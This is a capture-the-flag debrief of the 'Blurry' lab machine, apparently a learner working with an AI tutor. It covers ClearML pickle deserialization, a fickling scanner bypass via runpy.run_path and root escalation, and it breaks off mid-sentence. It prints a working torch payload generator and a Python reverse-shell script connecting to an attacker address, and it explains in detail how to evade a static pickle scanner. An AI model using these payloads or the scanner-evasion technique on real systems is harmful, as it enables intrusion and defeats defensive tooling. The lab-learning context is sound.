The debrief file is open. It is to be filled.

The debrief has six sections. Each one is to be answered honestly — notes are not to be looked at for the first pass. Writing is to be done from memory, then verification is to be performed.

---

**Section 1 — The Kill Chain**

The full attack path from nmap to root flag is to be written in one unbroken chain. Every step, in order. No skipping. It is to be formatted like the Canape and Laboratory entries in the project context summary.

That is where it is to be started. What is written is to be shown.

The response to Section 1 is provided. The Preface and context statement are to be noted.

# Blurry post-root debrief


The debrief has six sections. Each one is to be answered honestly — notes are not to be looked at
for the first pass. Writing is to be done from memory, then verification is to be performed.

---

**Section 1 — The Kill Chain**

The full attack path from nmap to root flag is to be written in one unbroken chain.
Every step, in order. No skipping. It is to be formatted like the Canape and Laboratory entries
in the project context summary.

Preface and context.
------------------------
This is being written the morning after.
Some technical difficulties and exhaustion stopped the work last night.
Also, per the scope of this debrief, notes are not looked at.
Therefore, many of these steps in this summary will be vague, and lacking in important detail.
And the format used in the Canape lab entries is not recalled.
All of Blurry is simply going to be data-dumped here.

So, this is more like a high-level overview-summary.
An official, notes-referrenced, detailed and technical summary should likely be
completed after this, to really drill it in.



Attack path
----------------
- nmap was run
- the useful url info was discovered from nmap's port 80 results.
- nmap results were analyzed and the url was put in `/etc/host`
- the web app was navigated to and explored,
- it was a very busy web app, a lot of things in it, it was not known what to look at
- it would of been very easy to go down a rabbit hole to nowhere, but the correct avenue was gone down with help from Claude.
- a user's project folder was found, user's name was BlackSwan. And in this user's project was an automated python script
that ran on regular intervals.
- that code was read and anlyzed
- It iterated over, and processed key-value pairs of data, (notes would need to be checked to tell more)
- and it had a desirialization vuln, though that was not obvious at first glance.
- no pickling or desirialization code was present in the code
- that occured under the hood via some other method.(the name was forgotten, notes would need to be referred to later.)
- after careful deep analysis of the python script, an exploit python file was able to be created
that would run and pop a reverse shell.

- In this exploit a `__reduce__` method was utilized inside an Exploit class, the purpose of which is to deserialize an object,
the dunder __reduce__ method returned a immutable tuple that contained a revese shell command in python.

- once executed, this python script pop'd a shell on the box. The user was now jipitty on Blurry.

- after the reverse shell was obtained, `sudo -l` was run to discover what this jipitty user could run
as sudo
- that uncovered a shell script that analyzed the models, and a python script too
both the python and the bash script performed a desirialization safety scan/check of some sort
the bash script unziped the filels into a tmp file, ran the pickling safety check on each

the python script, loaded the files directly
(the exact details of both are in the notes, and looking at notes is out of scope for this first phase of the debriefe)

- The best way to sneek the __reduce__ method again and get it past those two filter
scripts needed to be determined

- doing that got root user on the box
- two more exploits were created
- one that uploaded a malicious .pth.. it is thought it was a .pth
anywasy a malicious file was uploaded,
the other  one would trigger the execution of the malicious one.

- these were written on the kali machine
then, in order for them to be gotten on jipitty's account,(from which elevation to root would be done, via these exploits)
a local python server was spun up
Then in jipitty's reverse shell, they were wget'ed from Kali, to the Blurry shell.

After some challenges in defeating an automated cleaner script that was deleting those files
a one-liner was used that uploaded and executed those exploits in one go.

a third terminal was opened to listen for the root connection.

The one-liner that uploaded 2 exploits and executed them worked.

Root was obtained.

---

The debrief is honest — that is exactly the right approach. Writing from memory first reveals what actually stuck vs what was just followed along with.

The verification pass is now to be done. Notes are to be opened and the gaps filled in. Prompting is to be done section by section.

**The gaps to fill in Section 1:**

These are the things that were flagged as vague or forgotten:

1. What were the four virtual hosts discovered and what did each one serve?
2. What was the name of the automated script and what SDK method was the vulnerable line?
3. What did `artifact_object.get()` do internally — the full chain?
4. What was the bash script called and what safety tool did it use?
5. What was the `runpy` bypass — why did it work?
6. What were the exact two files that were created for privesc and what did each one do?

Notes are to be gone through, each of those six gaps filled in, and Section 1 rewritten with the technical detail restored.

Then Section 2 is to be moved to.

**What is Section 2?**

The standard debrief format asks: **what did the preflight predictions get right, and what did they miss?**

The preflight document is to be pulled up and the predictions compared against what actually happened. But Section 1 verification is to be done first.

---

## Replies

1. What were the **Four Virtual Hosts** discovered and what did each one serve?
Actually 6 different URLs were added to /etc/hosts, for Blurry.. redundant behaviour? Likely.
```bash
10.129.3.53    blurry.htb app.blurry.htb
10.129.3.53    blurry.htb app.blurry.htb api.blurry.htb files.blurry.htb chat.blurry.htb
```

**The hosts and their purposes**
- blurry.htb --> main web app / signin page -- landing page
- app.blurry.htb --> ClearML web UI the dashboard, “GETTING STARTED”, WorkSpace and Projects
- api.blurry.htb --> login/register requests
- chat.blurry.htb -->   Rocket.Chat instance Slack chat app
- files.blurry.htb -->  This is the ClearML artifact storage server.. where the .pt file was stored.

-------------------------------------------------------------------------------

2. What was the name of the automated script and what SDK method was the vulnerable line?

After the Install the ClearML Python SDK was done.
clearml-init is to be run and configured against the target.

The automated script: `review_tasks.py`
SDK method: `data = artifact_object.get()`

-------------------------------------------------------------------------------

3. What did `artifact_object.get()` do internally — the full chain?

 - The Critical, Vulnerable Line of Code: `data = artifact_object.get()`

 - ClearML's .get() method downloads the artifact file and deserializes it.
 - For `.pt` files, it calls `torch.load()` internally.
 - Other formats (raw pickle, numpy, joblib) are equally vulnerable.
 - Then `torch.load()` calls `pickle.loads()`
 - Pickle deserialization calls `__reduce__` on any object on which it is defined.
 - executing whatever callable it returns -- no questions asked.
 - `__reduce__` returns a tuple: (callable, args).
 - Pickle then calls callable(*args) -- both the function AND its arguments are controlled by the attacker.
 - This is a full arbitrary code execution primitive, not just a function call.

 - Threat Model -- Attack Entry Point:
 - Any user with write access to this ClearML project can upload a malicious artifact.
 - It is tagged `review` and this script is waited for to run.
 - The blast radius is defined by the OS permissions of whoever executes this script.
 - No validation, No sandboxing, no safety check exists at the deserialization layer.
 - The process runs as a real user on the box.
 - Whatever `__reduce__` returns will be executed in that user's context.

 - The `__reduce__` returns a tuple: (callable, args).
 - That's the return tuple where the reverse shell command is placed

Essentially, this is what it does:
   - Downloads the artifact file from ClearML’s file storage (`files.blurry.htb`).
   - Deserializes the content into a Python object.

-------------------------------------------------------------------------------


4. What was the bash script called and what safety tool did it use?

bash script: `/usr/bin/evaluate_model`
safety tool used: `fickling`

the Python script: `evaluate_model.py`

------------------------------------------------------------------------------


5. What was the `runpy` bypass — why did it work?

- generate_payload.py
```python
import torch
import runpy

class PthExploit:
    def __reduce__(self):
        return(runpy.run_path, ("/models/payload.py",))
           # payload.py contains a reverse shell code.

# instance of the class
pth = PthExploit()
torch.save(pth, "/models/malicious.pth")
```
Runpy is intended to locate and execute Python modules, or scripts,without
requireing them to be imported in the traditional way.

by placing runpy inside the __reduce__ method, runpy can be smuggled to
execute a python script that would ohterwise of been detected and blocked by the
pickle scanner

`__reduce__` was used to write a python file to disk
`runpy.run_path()` was used to execute that external file
The reverse shell logic lives in the external file, NOT inside the pickled object.

So, this line `return(runpy.run_path, ("/models/payload.py",))`
from `generate_payload.py` smuggled in and executed the python script below
which creates a reverse shell via a TCP socket

- payload.py
```python
#!/usr/bin/env python3

import socket
import subprocess
import os

# Step 1 — Create and connect the socket.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.207", 9999))

# Step 2 Duplicating the socket's file descriptor number
# This wires the shell's stdin, &  stderr to your socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# **Step 3 — Spawn the shell.**
subprocess.call(["/bin/sh","-i"])
```
So the reason it worke'd is b/c runpy is a legitamate std lb mod
a cll to `runpy.run_path()` does not look suspicious, as if an os.system
or subprocess command were to be directly returned from the __reduce__ method.

------------------------------------------------------------------------------

6. What were the exact two files that were created for privesc and what did each one do?

- Notes are to be gone through,
- each of those six gaps filled in,
- and **Section 1 rewritten** with the technical detail restored.
# 6 was answered while 5 was being answered

---


### Now Section 2

The preflight document is to be pulled up. The predictions are to be compared against what actually happened.

What was gotten right? What was missed? What was surprising?

---

## What the Preflight Got Right

**Attack surface — excellent.** Worker/agent behavior, artifact deserialization sinks, and absence of validation were predicted. That's exactly what the box was. The attack surface analysis was senior-level thinking written before the box was touched.

**Payload structure — correct.** Class with `__reduce__`, tuple return, reverse shell. The right primitive was had.

**Post-exploitation — remarkably accurate.** `evaluate_model.py` was named specifically. The exact privesc was described: malicious PyTorch model → deserializes as root → shell. The fickling/runpy split was understood before it was done.

**Sticking point prediction — exactly right.** The hardest part was predicted to be crafting the exploit. It was — specifically understanding `artifact_object.get()` and the `__reduce__`/`exec` constraint.

---

## What the Preflight Got Wrong

**The CVE chain order.** CSRF → fileserver upload → path traversal → pickle load was predicted. The actual chain was simpler: register account → SDK authentication → upload artifact via API → agent deserializes. No CSRF, no path traversal needed. The platform's legitimate features were the delivery mechanism.

---

## The Most Important Observation

The following was written:

> "I forgot what I learned and therefore didn't know that what I was doing was already in my preflight."

This is the real lesson from Section 2. The preflight was accurate. But it was not consulted during the box. The preflight document isn't just preparation — it's a live reference. Next box: the preflight is to be opened alongside the terminal and predictions are to be checked as work proceeds.

---

## Ready for Section 3?

**What are the remaining debrief sections?**

Standard format is:

- Section 3 — What slowed things down and why
- Section 4 — Concepts that need deeper study
- Section 5 — What transfers to the next box
- Section 6 — One-paragraph summary for the writeup

Section 3 is to be written from memory. What specifically slowed things down on this box?

What slowed things down was the unfamiliarity with the platform which was being attacked, and realizing that the python script revealed vulnerability to deseri attack despite not having the picking module in it.
Also, had the notes been consulted, then the predictions could of and would of been checked as work proceeded.

---

# Section 3 — What slowed things down and why

This part:

---

The ByPass

The dialogue is provided below:

---

The full picture is now possessed. It is to be analyzed before anything is written.

**Three questions:**

**1.** Fickling only blocks one specific severity level. What is it, and what does that mean for the payload?

**2.** After the fickling check passes, what script does it call, and with what argument? The last three lines are to be looked at carefully.

**3.** There's a subtle but critical detail in how `evaluate_model.py` loads the model vs how the bash script calls it. This line in `evaluate_model.py` is to be looked at:

```python
state_dict = torch.load(model_path)
```

And this line in the bash script:

```bash
/usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
```

`evaluate_model.py` receives the `.pth` path as `sys.argv[1]` and calls `torch.load()` on it directly — not on the extracted pickle. What does that mean for where the `__reduce__` payload needs to live?

All three are to be answered before anything is written.

--

#### 1 & 2 were good, but number 3 was found to be really tough.


Both are correct. Especially the critical detail — the **original file** is passed, not the extracted pickle. That's the key insight.

Now question 3. All the information to answer it is possessed.

`evaluate_model.py` does this:

```python
state_dict = torch.load(model_path)
```

Where `model_path` is the original `.pth` file.

`torch.load()` on a `.pth` file deserializes it directly — it doesn't look inside a temp directory, it loads the file that was given to it.

So here's the question:

**Fickling scans the extracted `.pkl` files inside the temp directory. `torch.load()` deserializes the original `.pth` file directly. If the `__reduce__` payload is in the original `.pth` file — does fickling ever actually scan it?**

This is to be thought about carefully. The bash script extracts to temp, scans what's in temp, deletes temp, then loads the original. Are those the same thing?

-  the response:
```
sounds like the bash script and the python script are dealing two different filetypes bash works with the .pkl files python works with the .pth So more needs to be known about those before number 3 can be figured out
```

The instinct is good. The background is provided.

---

## `.pth` vs `.pkl` — What's Actually Inside

A `.pth` file is not a single flat file. It's a **ZIP archive** containing multiple files inside. This was confirmed:

```bash
file /models/demo_model.pth
/models/demo_model.pth: Zip archive data
```

Inside that ZIP, PyTorch stores two things:

- `archive/data.pkl` — the pickle file containing the serialized object
- `archive/data/` — tensor data files

So the relationship is:

```
demo_model.pth  (ZIP archive)
└── archive/
    ├── data.pkl     ← this is what fickling scans
    └── data/
        └── 0        ← raw tensor bytes
```

---

## What This Means for Question 3

The bash script extracts the `.pth` ZIP to temp, finds `data.pkl` inside, and runs fickling on that extracted `.pkl`.

Then it **deletes the temp directory** and passes the **original `.pth`** to `torch.load()`.

So the question is to be asked again:

**If the `__reduce__` payload is crafted and saved with `torch.save()` — where does the payload end up inside the `.pth` ZIP? And is that the same file fickling scanned?**

- the response
- Tough question, so help from this angle is requested, it is thought that the answer is almost there.

the bash script extracts the archive to `/models/temp/` and runs fickling on the extracted `.pkl` files inside it, the actual model execution happens like this:

```
python3 /models/evaluate_model.py "$MODEL_FILE"

```

And inside `evaluate_model.py`:

```python
state_dict = torch.load(model_path)   # model_path = original $MODEL_FILE

```

Which means:

- `torch.load()` is called on the original `.pth` file, not on any extracted pickle inside `/models/temp/`.
- Therefore, the malicious reduce payload should be in whatever object torch.load() deserializes when given the original file path???

Part of the thinking is that, "what's the difference?" One way the files are extracted into a temp file and being analyzed, and when done via the python script, it loads the files raw.. But not the same?

The bash script unzips the .pth into a temp file, then scans the unzipped tmp files. The python script loads the original.pth and???

sounds like the bash script is being more detailed, and safely handling the files, At the same time, if the `.pth` is like a `.zip` then the python script is just loading unzipped files..

This is to be cleared up.

The edge is being approached. It is to be cleared up.

---

## The Key Question

When `torch.load()` opens the `.pth` ZIP and deserializes `data.pkl` inside it — is that the same `data.pkl` that fickling scanned?

**Yes. It's the same file.**

The `.pth` is a ZIP. Both the bash script and `torch.load()` are ultimately reading the same `data.pkl` inside that ZIP.

---

## So Where's the Bypass?

Here's what fickling actually flags as `OVERTLY_MALICIOUS`:

Direct dangerous callables in `__reduce__` — things like `os.system`, `exec`, `subprocess.Popen`.

Here's what fickling does **not** flag as `OVERTLY_MALICIOUS`:

`runpy.run_path()` — because it's a legitimate stdlib module with no obviously dangerous opcode pattern.

---

## The Real Bypass

It's not about _where_ the payload lives in terms of files. It's about _what callable_ fickling sees in the pickle bytecode.

```
# fickling sees this → OVERTLY_MALICIOUS → file deleted
__reduce__ returns (os.system, ('bash -i ...',))

# fickling sees this → not OVERTLY_MALICIOUS → file survives
__reduce__ returns (runpy.run_path, ('/models/payload.py',))
```

The malicious code lives in `payload.py` on disk. The pickle only contains a call to a legitimate stdlib function.

---

Is that confusion resolved? Now — are the two files ready to be written?

The confusion was kinda cleared up.
Exhaustion was very present by that point.


# Regarding section 3

### Summary of What Was Understood

It was explained that the key to bypassing `fickling` isn’t primarily about where the payload file lives (original `.pth` vs extracted files), but rather about **what `fickling` sees** when it performs static analysis on the pickle bytecode. Specifically, it was pointed out that `fickling` flags direct dangerous callables in `__reduce__` (such as `os.system` or `subprocess.Popen`) as `OVERTLY_MALICIOUS`. However, it does not flag calls to legitimate standard library modules like `runpy.run_path()` in the same way. It was mentioned that this is why the `runpy` technique works — because the dangerous logic is moved outside the pickled object, the static scanner has nothing overtly malicious to detect inside the `.pth` file itself. This explanation was found helpful, but full understanding of the mechanism is to be made sure of.

### Request for Elaboration

Elaboration on this point is requested. Specifically, understanding is being sought of:

- Why exactly does moving the malicious code into an external file (and calling it via `runpy`) make the payload less likely to be flagged by `fickling`?
- Is it mainly because `runpy.run_path()` itself doesn’t contain obviously dangerous opcodes, or is there something more about how `fickling` analyzes the pickle structure in this scenario? A solid grasp of this is wanted before moving on to writing the actual payload files.




That is a good question. This is to be made precise.

---

## How Fickling Actually Works

Fickling is a static analyzer. It reads pickle bytecode — the raw opcodes that tell the pickle machine what to do during deserialization. It looks for specific opcode patterns it considers dangerous.

The most dangerous pattern is this opcode sequence:

```
GLOBAL (module, callable)   ← names what to call
MARK
<args>
TUPLE
REDUCE                       ← calls it
```

When fickling sees `GLOBAL os system` followed by `REDUCE`, it knows: "this pickle will call `os.system()` during deserialization." That's `OVERTLY_MALICIOUS`.

---

## Why `runpy` Bypasses It

When `__reduce__` returns `(runpy.run_path, ("/models/payload.py",))`, the pickle bytecode contains:

```
GLOBAL runpy run_path
MARK
"/models/payload.py"
TUPLE
REDUCE
```

Fickling sees `GLOBAL runpy run_path`. It checks its severity table. `runpy.run_path` is a legitimate stdlib function with no dangerous opcode signature. It's not on the blocklist. Severity: not `OVERTLY_MALICIOUS`. File survives.

The dangerous code — the reverse shell — lives in `payload.py` on disk. That's a plain text file. Fickling never reads it. Fickling only reads pickle bytecode.

---

## The Precise Answer to the Question

It's **both** things that were asked about, but in this order:

1. `runpy.run_path` doesn't appear in fickling's dangerous callable list — so the opcode pattern doesn't trigger the severity threshold.

2. The actual malicious logic is in an external file that fickling never touches — static analysis has no reach beyond the pickle bytecode itself.


The bypass works because fickling can only see what's inside the pickle. Everything outside it is invisible to static analysis by definition.

---

Is the loop fully closed? If yes, it is to be written into Section 3 of the debrief and Section 4 is to be moved to.

---


## Section 4 — Concepts That Need Deeper Study

This is to be written from honest self-assessment. Notes are not to be looked at yet.

Three questions:

**1. What concepts were encountered on this box that were followed along with but couldn't be reproduced from scratch right now?**

Be specific. Not "deserialization" in general — the specific mechanic, SDK call, or technique that was understood in the moment but would be struggled with to reconstruct tomorrow without help is to be named.

**2. What would have been missed entirely without guidance?**

The moment where a hint or an explanation was needed to proceed — what was the knowledge gap underneath it?

**3. What is wanted to be able to be done independently on the next box that could not be done independently on this one?**

That last question defines the study list.

All three are to be answered. Writing is to be done from memory first, then the answers are to be turned into a concrete study plan.


### Replies

1. the technicals of  of how the bypass worked.
The use of the `__reduce__` method is understood, and how to use an os command in the tuple return statement.
But the understanding of how this exploit bypassed the pickling detection was struggled with.
Confusion was kinda present on how the technicals of how the shell script that ustilized fikling and the python script that loaded the object, seemingly with 0 obsfucation, how this payload was getting past the guards.
Which file went first.

Response:

That is a good question. This is to be made precise.

---

## How Fickling Actually Works

Fickling is a static analyzer. It reads pickle bytecode — the raw opcodes that tell the pickle machine what to do during deserialization. It looks for specific opcode patterns it considers dangerous.

The most dangerous pattern is this opcode sequence:

```
GLOBAL (module, callable)   ← names what to call
MARK
<args>
TUPLE
REDUCE                       ← calls it
```

When fickling sees `GLOBAL os system` followed by `REDUCE`, it knows: "this pickle will call `os.system()` during deserialization." That's `OVERTLY_MALICIOUS`.

---

## Why `runpy` Bypasses It

When `__reduce__` returns `(runpy.run_path, ("/models/payload.py",))`, the pickle bytecode contains:

```
GLOBAL runpy run_path
MARK
"/models/payload.py"
TUPLE
REDUCE
```

Fickling sees `GLOBAL runpy run_path`. It checks its severity table. `runpy.run_path` is a legitimate stdlib function with no dangerous opcode signature. It's not on the blocklist. Severity: not `OVERTLY_MALICIOUS`. File survives.

The dangerous code — the reverse shell — lives in `payload.py` on disk. That's a plain text file. Fickling never reads it. Fickling only reads pickle bytecode.

---

## The Precise Answer to the Question

It's **both** things that were asked about, but in this order:

1. `runpy.run_path` doesn't appear in fickling's dangerous callable list — so the opcode pattern doesn't trigger the severity threshold.

2. The actual malicious logic is in an external file that fickling never touches — static analysis has no reach beyond the pickle bytecode itself.


The bypass works because fickling can only see what's inside the pickle. Everything outside it is invisible to static analysis by definition.

---

Is the loop fully closed? If yes, it is to be written into Section 3 of the debrief and Section 4 is to be moved to.

A critically reviewed and improved version in clean bullet-point format is provided:

---

### How Fickling Works and Why the `runpy` Bypass is Effective

so if the understanding is correct,

- **Fickling is a static analyzer**: It does not execute the pickle file. Instead, it reads the raw pickle opcodes and looks for known dangerous patterns that indicate code execution will occur during deserialization.

- **The most dangerous pattern fickling detects** is the combination of the `GLOBAL` opcode (which specifies a module and callable, such as `os.system`) followed by the `REDUCE` opcode. This sequence tells fickling that the pickle will call a dangerous function like `os.system()` or `subprocess.Popen` when it is loaded.

- When fickling detects this pattern, it assigns a high severity rating — typically **`OVERTLY_MALICIOUS`** — and the model is flagged and deleted by the bash script.

- In contrast, when `__reduce__` returns `(runpy.run_path, ("/models/payload.py",))`, the pickle bytecode contains a `GLOBAL` opcode pointing to `runpy.run_path`. Since `runpy.run_path` is a legitimate function from the Python standard library, it is not present in fickling’s list of dangerous callables. As a result, fickling does not classify it as `OVERTLY_MALICIOUS`.

- The actual malicious code (the reverse shell) is not located inside the pickle at all. It resides in a separate file on disk (`payload.py`). Because fickling only performs static analysis on the pickle bytecode itself, it has no visibility into external files that may be executed later.

- This is the core reason the `runpy` technique bypasses fickling: it uses a trusted standard library function (`runpy.run_path`) to move the dangerous logic outside of the serialized object. The pickle file itself appears relatively benign to static analysis.

- An important nuance is that this bypass is effective against **static** detection tools. It does not make the payload inherently safer at runtime — it simply avoids triggering the specific detection rules that `fickling` uses.

---

### Key Takeaway

The `runpy` bypass works because it exploits a fundamental limitation of static analysis: **fickling can only evaluate what is inside the pickle file**. By delegating the actual malicious behavior to an external file through a legitimate stdlib function, the dangerous code becomes invisible to the scanner.

More is to be shown using this code. (it is what was used)

`evaluate_model.py`
```python
def load_model(model_path):
    model = CustomCNN()

    # deserializes it directly, no temp files created or used.
    state_dict = torch.load(model_path)
    model.load_state_dict(state_dict)

    model.eval()
    return model

```


`generate_payload.py`
```python
import torch
import runpy

class PthExploit:
    def __reduce__(self):
    """
    When __reduce__ returns (runpy.run_path, ("/models/payload.py",)),
    the pickle bytecode contains a GLOBAL opcode pointing to runpy.run_path.

    Since runpy.run_path is a legitimate function from the Python standard library,
    it is not present in fickling’s list of dangerous callables. As a result,
    fickling does not classify it as OVERTLY_MALICIOUS.
    """
        return(runpy.run_path, ("/models/payload.py",))

# instance of the class
pth = PthExploit()
torch.save(pth, "/models/malicious.pth")

```

`evaluate_model.sh`     (snippet from the pickling part)
```bash
# only find regular files, named "*.pkl" OR named exactly pickle, output the results separated by nullbytes
# each iteration, extracted_pkl holds the path to one pickle file found inside the archive
/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do

  # Using a subshell, this line Runs the fickling security analyzer on each exctracted pickle file
  # Does not execute, and output JSON results to file descriptor 1 (stdout), Store the JSON output in fickling_output
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    # pipes output to check for entries where the severity field is "OVERTLY_MALICIOUS"
    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

```

`payload.py`
```python
#!/usr/bin/env python3

import socket
import subprocess
import os

# For reference ATTACKER_IP = "10.10.14.207" LISTENER_PORT = 9999
# Step 1 — Create and connect the socket.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.207", 9999))

# Step 2 Duplicating the socket's file descriptor number
# This wires the shell's stdin, &  stderr to your socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# **Step 3 — Spawn the shell.**
subprocess.call(["/bin/sh","-i"])
```


## Explained with code
The understanding is exactly right. That writeup is clean and accurate — it is to be kept in the notes as-is.

The full execution trace is now to be shown using the actual code, so that every step can be seen in sequence.

---

## The Full Execution Trace

**Step 1 — `generate_payload.py` is run:**

```python
pth = PthExploit()
torch.save(pth, "/models/malicious.pth")
```

`torch.save()` calls `pickle.dumps()` on `PthExploit()`. Pickle calls `__reduce__()`. Gets back `(runpy.run_path, ("/models/payload.py",))`. Serializes that into bytecode. Wraps it in a ZIP. Writes `malicious.pth`.

The bytecode inside `malicious.pth/archive/data.pkl` looks like:

```
GLOBAL 'runpy run_path'
SHORT_BINSTRING '/models/payload.py'
TUPLE1
REDUCE
STOP
```

**Step 2 — Fickling scans `data.pkl`:**

```bash
fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")
```

Fickling reads those opcodes. Sees `GLOBAL runpy run_path`. Checks severity table. Not `OVERTLY_MALICIOUS`. JSON output contains no matching severity. The `jq` check finds nothing. File survives. Not deleted.

**Step 3 — `evaluate_model.sh` passes the original file to Python:**

```bash
/usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
# → python3 /models/evaluate_model.py /models/malicious.pth
```

**Step 4 — `evaluate_model.py` calls `torch.load()`:**

```python
state_dict = torch.load(model_path)
```

`torch.load()` opens `malicious.pth`, extracts `data.pkl`, calls `pickle.loads()` on it. Pickle reads the bytecode. Hits `GLOBAL runpy run_path` — imports `runpy`, gets `run_path`. Hits `REDUCE` — calls `runpy.run_path("/models/payload.py")`.

**Step 5 — `runpy.run_path()` executes `payload.py` as root:**

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.207", 9999))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh","-i"])
```

The socket connects to the listener. File descriptors redirected. `/bin/sh` spawns. Shell returns as root.

---

## The Key Insight Visualized

```
malicious.pth
└── archive/data.pkl
    └── GLOBAL runpy run_path    ← fickling sees this, passes it
        └── "/models/payload.py" ← fickling never reads this file

payload.py                       ← fickling has zero visibility here
└── reverse shell code           ← executes as root at runtime
```

Static analysis boundary ends at the pickle bytecode. Everything outside is invisible.

---

Now — Section 4. Three questions, answered from honest self-assessment. What concepts would be struggled with to reproduce independently right now?

The instinct is good — but the execution trace is not to be allowed to do Section 4.

The trace showed how it works when explained. Section 4 is about what could not be done _independently_.

The chat is to be closed. A blank document is to be opened. These three questions are to be answered without scrolling back:

**1.** Without help, could `artifact_object.get()` have been identified as the vulnerability by reading `review_tasks.py` alone? What was the specific gap?

**2.** Could the `exec()` wrapper for `__reduce__` have been written independently? What was the conceptual block?

**3.** Could the `runpy` bypass have been designed without being guided to it? What would have been tried instead?

One honest sentence each. Those three answers are the Section 4 study list.

They are to be written, then they are to be turned into concrete actions for Section 5.

## The response

1. No, not at first, the gap was not knowing that `data = artifact_object.get()` was a way in which pickling, or a call to pickling was implemented. What `.get()` does would of had to be looked up.

2. Possibly, notes from a previous time it was used are possessed, and the `__reduce__` method was looked up, it was begun with prior knowledge, but assistance was needed in creating it again. coding and developing is a perishable skill

3. No. The runpy bypass could not of been designed without guidance at all. Maybe it would of been looked up. but even with the assistance of AI, it was such new territory.


The answers are honest. That's exactly what a debrief should look like.

Section 4 written cleanly from the three answers is provided:

---

## Section 4 — Concepts That Need Deeper Study

**1. SDK/library method behavior at trust boundaries.** `artifact_object.get()` could not be identified as a deserialization sink without knowing what the ClearML SDK does internally. The gap is not code reading — the gap is library knowledge. Study list: when any unfamiliar SDK or library method called on untrusted input is encountered, the source is to be looked up before moving on. This applies to any framework — not just ClearML.

**2. `__reduce__` and pickle payload construction.** Prior knowledge is possessed but it's perishable. Scaffolding was needed to reconstruct it. Study list: a pickle deserialization payload is to be written from scratch once a week without notes until it's automatic. It's a fundamental primitive that appears on every Python deserialization box.

**3. Static analysis bypass techniques.** The `runpy` bypass was entirely new territory. It could not have been designed independently. Study list: fickling's source code is to be read to understand what opcodes it flags and why. Then other bypass techniques are to be researched — what else does fickling miss? What about other static analyzers?

---

That's Section 4 done.

**Section 5 is short.** One question:

What from this box transfers directly to the next deserialization target that is hit — whether that's a CVE, a box, or a bug bounty finding?

Three bullet points are to be written. What mental models are carried forward?


The recommended way to answer this question is as follows. The goal is to show **mental models** (ways of thinking), not just technical details from Blurry.

### Suggested Answer (Three Bullet Points)

- **Map the full ingestion-to-deserialization flow before writing any payload.**
  On Blurry, the real execution happened in `evaluate_model.py` via `torch.load()`, not necessarily where the artifact was first uploaded or scanned. Identifying *exactly where* and *in what context* deserialization occurs (user request, background worker, sudo binary, etc.) is now prioritized rather than assuming the obvious entry point is where code will execute.

- **Static analysis tools have structural blind spots that can be exploited by moving logic outside the serialized object.**
  Fickling only inspects pickle bytecode. By using `runpy` to load code from an external file, the dangerous logic became invisible to the scanner. This taught that opportunities to separate the *trigger* (what goes inside `__reduce__`) from the *payload* (what actually runs) are to be looked for, especially when facing defensive tooling.

- **The callable returned by `__reduce__` is more important than the data being deserialized.**
  Whether using `os.system`, `subprocess.Popen`, `exec`, or `runpy.run_path`, the security impact depends entirely on what gets executed during unpickling. This mental model helps in quickly evaluating the severity of a deserialization vulnerability by focusing on the gadget chain rather than getting lost in the surrounding application logic.

---

### Why These Three Work Well

| Bullet                          | Why It's a Strong Mental Model                                          | Transferability                                                                |
| ------------------------------- | ----------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| **Flow mapping**                | Shifts focus from "finding a vuln" to "understanding execution context" | Applies to any deserialization target (Java, PHP, Ruby, YAML, etc.)            |
| **Static analysis blind spots** | Teaches thinking about *evasion*, not just exploitation                 | Very useful in real-world bug bounties and CTFs where defensive tooling exists |
| **Focus on the callable**       | Simplifies analysis of complex deserialization chains                   | Core skill for gadget hunting across different serialization formats           |

### Alternative Options (if different angles are wanted to be emphasized)

Two other possible directions are provided, depending on what is wanted to be emphasized:

**Option B (More attacker mindset):**
- Always look for ways to move malicious logic outside the serialized object when static defenses are present.
- Prioritize understanding *how* the target ingests and processes objects (tags, queues, background workers, etc.).
- Treat file format quirks (e.g. `.pth` being a ZIP) as potential opportunities rather than obstacles.

**Option C (More defensive / researcher mindset):**
- Deserialization vulnerabilities are often found in background/automated processing paths rather than direct user input.
- Static scanners are useful but have predictable limitations that can be tested.
- The real impact of a deserialization bug is often determined by the privileges of the process doing the loading.

---

Refinement of one of these versions, or combination of elements from them, can be helped with.


## This is the response
- Map the full ingestion-to-deserialization flow before writing any payload, prioritize identifying exactly where and in what context deserialization occurs
- Static analysis tools have structural blind spots that can be exploited by moving logic outside the serialized object, look for opportunities to separate the trigger (what goes inside `__reduce__`) from the payload (what actually runs), especially when facing defensive tooling.
- The callable returned by `__reduce__` is more important than the data being deserialized, This mental model helps in quickly evaluating the severity of a deserialization vulnerability by focusing on the gadget chain rather than getting lost in the surrounding application logic.

## Instructor's response
Those three bullets are strong. They are to be kept exactly as written — that's publication-quality TTP documentation.

The second one especially:

> "Separate the trigger from the payload"

That's a reusable mental model that applies beyond pickle — Java deserialization gadget chains, PHP unserialize, .NET BinaryFormatter. The pattern is the same everywhere: what fires the execution vs what the execution does are two separate design decisions.

---

## Section 6 — One Paragraph Summary

This is the writeup paragraph. The one that would be published, or read aloud at BSides as context before the technical deep-dive.

It is to be written now. It should contain:

- What the box is
- The foothold in one sentence
- The privesc in one sentence
- The key lesson in one sentence

No bullet points. Flowing prose. Three to four sentences maximum.


Blurry is a vulnerable ClearML instance, a platform that allows users to
